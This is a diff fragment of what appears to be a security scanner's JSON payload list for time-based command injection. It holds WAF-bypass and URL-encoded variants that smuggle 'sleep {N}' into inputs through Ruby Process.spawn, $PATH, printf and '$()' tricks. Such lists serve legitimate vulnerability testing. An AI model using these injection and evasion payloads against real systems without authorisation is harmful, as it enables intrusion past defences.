+    "confirmable": true,
+    "payload": "';Process.spawn('sleep {N}');#"
+  },
+  {
+    "name": "waf_env_path",
+    "category": "waf-bypass",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": ";$PATH:sleep {N}"
+  },
+  {
+    "name": "waf_printf",
+    "category": "waf-bypass",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": ";$(printf sleep) {N}"
+  },
+  {
+    "name": "encoded_or",
+    "category": "encoded",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "%7c%7csleep%20{N}"
+  },
+  {
+    "name": "encoded_subst_dbl",
+    "category": "encoded",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "%2524%2528sleep%2520{N}%2529"
+  }
 ]
